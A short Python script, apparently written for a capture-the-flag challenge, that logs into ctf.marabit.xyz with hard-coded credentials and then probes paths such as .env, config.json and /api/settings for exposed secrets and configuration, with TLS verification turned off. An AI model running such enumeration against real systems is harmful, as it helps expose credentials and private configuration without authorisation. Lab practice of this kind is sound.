import requests

session = requests.Session()
url_login = "https://ctf.marabit.xyz/api/auth/login"
data = {"email": "analyst@blackarchive.local", "password": "ArchiveAccess2026!"}
session.post(url_login, json=data, verify=False)

urls = [
    "https://ctf.marabit.xyz/.env",
    "https://ctf.marabit.xyz/config.json",
    "https://ctf.marabit.xyz/api/config",
    "https://ctf.marabit.xyz/api/settings",
    "https://ctf.marabit.xyz/mobile-map.json",
    "https://ctf.marabit.xyz/map.json"
]

for u in urls:
    r = session.get(u, verify=False)
    print(u, r.status_code, r.text[:100])
